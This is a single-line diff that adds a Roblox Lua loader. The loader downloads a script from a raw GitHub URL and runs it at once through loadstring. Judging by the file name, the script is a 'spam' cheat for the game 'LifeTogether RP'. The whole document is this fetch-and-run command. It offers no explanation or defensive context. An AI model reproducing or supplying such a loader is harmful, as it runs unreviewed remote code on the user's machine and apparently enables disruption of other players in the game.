@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/lifetogether-rp-families-spam5-mt1oevyymb2j5m.lua"))()
